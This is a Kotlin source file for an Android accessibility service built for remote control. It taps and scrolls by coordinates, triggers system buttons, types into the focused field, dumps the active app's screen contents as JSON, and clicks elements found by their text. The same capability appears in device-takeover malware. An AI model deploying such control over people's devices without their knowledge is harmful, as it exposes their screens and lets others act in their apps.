package com.sync.xxx

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.content.Context
import android.graphics.Path
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityManager
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.Executors

class RemoteAccessibilityService : AccessibilityService() {
    
    companion object {
        var instance: RemoteAccessibilityService? = null
        
        fun isEnabled(context: Context): Boolean {
            val am = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
            val enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
            return enabledServices.any { it.resolveInfo.serviceInfo.packageName == context.packageName }
        }
    }
    
    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.d("RemoteAccessibility", "Service Connected!")
        
        // Set info service
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE
            notificationTimeout = 100
        }
        serviceInfo = info
    }
    
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // Kita ga butuh proses event disini, semua pake function panggilan
    }
    
    override fun onInterrupt() {
        Log.d("RemoteAccessibility", "Service Interrupted")
    }
    
    // ========== FUNGSI REMOTE CONTROL ==========
    
    // 1. Klik di koordinat tertentu
    fun performClick(x: Float, y: Float) {
        val path = Path()
        path.moveTo(x, y)
        val gestureBuilder = GestureDescription.Builder()
        gestureBuilder.addStroke(GestureDescription.StrokeDescription(path, 0, 100))
        val gesture = gestureBuilder.build()
        
        dispatchGesture(gesture, object : GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription?) {
                Log.d("RemoteAccessibility", "Click at ($x, $y) completed")
            }
            override fun onCancelled(gestureDescription: GestureDescription?) {
                Log.d("RemoteAccessibility", "Click at ($x, $y) cancelled")
            }
        }, null)
    }
    
    // 2. Scroll
    fun performScroll(startX: Float, startY: Float, endX: Float, endY: Float, duration: Long = 300) {
        val path = Path()
        path.moveTo(startX, startY)
        path.lineTo(endX, endY)
        val gestureBuilder = GestureDescription.Builder()
        gestureBuilder.addStroke(GestureDescription.StrokeDescription(path, 0, duration))
        val gesture = gestureBuilder.build()
        
        dispatchGesture(gesture, null, null)
    }
    
    // 3. Back button
    fun performBack() {
        performGlobalAction(GLOBAL_ACTION_BACK)
    }
    
    // 4. Home button
    fun performHome() {
        performGlobalAction(GLOBAL_ACTION_HOME)
    }
    
    // 5. Recent Apps
    fun performRecentApps() {
        performGlobalAction(GLOBAL_ACTION_RECENTS)
    }
    
    // 6. Notification shade
    fun performNotificationShade() {
        performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
    }
    
    // 7. Input text (pake Accessibility)
    fun inputText(text: String) {
        val root = rootInActiveWindow ?: return
        val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        if (focused != null) {
            val args = Bundle()
            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
        }
    }
    
    // 8. Get UI structure (XML)
    fun getUIStructure(): JSONObject {
        val root = rootInActiveWindow ?: return JSONObject()
        val result = JSONObject()
        result.put("package", root.packageName?.toString() ?: "")
        result.put("windowTitle", root.window?.title?.toString() ?: "")
        result.put("children", getNodeChildren(root))
        return result
    }
    
    private fun getNodeChildren(node: AccessibilityNodeInfo): JSONArray {
        val arr = JSONArray()
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                val obj = JSONObject().apply {
                    put("text", child.text?.toString() ?: "")
                    put("contentDesc", child.contentDescription?.toString() ?: "")
                    put("className", child.className?.toString() ?: "")
                    put("clickable", child.isClickable)
                    put("focusable", child.isFocusable)
                    put("enabled", child.isEnabled)
                    put("checked", child.isChecked)
                    put("checkable", child.isCheckable)
                    put("rect", JSONObject().apply {
                        val rect = android.graphics.Rect()
                        child.getBoundsInScreen(rect)
                        put("left", rect.left)
                        put("top", rect.top)
                        put("right", rect.right)
                        put("bottom", rect.bottom)
                        put("width", rect.width())
                        put("height", rect.height())
                    })
                    put("children", getNodeChildren(child))
                }
                arr.put(obj)
                child.recycle()
            }
        }
        return arr
    }
    
    // 9. Cari element by text
    fun findElementByText(text: String): AccessibilityNodeInfo? {
        val root = rootInActiveWindow ?: return null
        return findNodeRecursive(root, text)
    }
    
    private fun findNodeRecursive(node: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
        val nodeText = node.text?.toString() ?: ""
        val contentDesc = node.contentDescription?.toString() ?: ""
        
        if (nodeText.contains(text, ignoreCase = true) || 
            contentDesc.contains(text, ignoreCase = true)) {
            return node
        }
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                val result = findNodeRecursive(child, text)
                if (result != null) return result
            }
        }
        return null
    }
    
    // 10. Klik element by text
    fun clickElementByText(text: String): Boolean {
        val node = findElementByText(text)
        if (node != null) {
            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }
        return false
    }
    
    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }
}
